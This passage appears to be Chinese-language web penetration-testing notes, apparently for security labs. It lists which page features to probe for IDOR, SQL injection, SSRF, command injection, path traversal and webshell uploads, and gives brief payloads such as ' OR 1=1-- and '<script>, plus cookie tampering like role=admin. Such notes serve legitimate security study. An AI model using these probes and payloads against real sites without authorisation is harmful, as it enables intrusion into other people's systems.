3. 看页面所有参数    → ?id= / ?user= / ?file= / ?url=
4. 看 Cookie          → Admin=true / role=admin
5. 页面源码找注释    → <!-- TODO: remove debug api -->
```

#### 进入功能点后

```
登录页       → 枚举用户名 + SQL 注入 + 弱口令
个人信息     → IDOR 改 id
上传功能     → webshell + Content-Type 绕过
API 端点     → JSON 格式 / 未授权访问
查询/搜索    → SQL 注入
Check stock  → SSRF + 命令注入
```

#### 判断漏洞优先级的经验

```
见到 id=xxx        → 立刻试 IDOR
见到 category=     → 试 SQL 注入 OR 1=1--
见到 file/url/api  → 试 路径穿越 + SSRF
见到上传框        → 试 webshell
见到输入框        → 试 '<script> 和 ' OR 1=1--
见到 Cookie 带 role → 试 admin=true
```

---
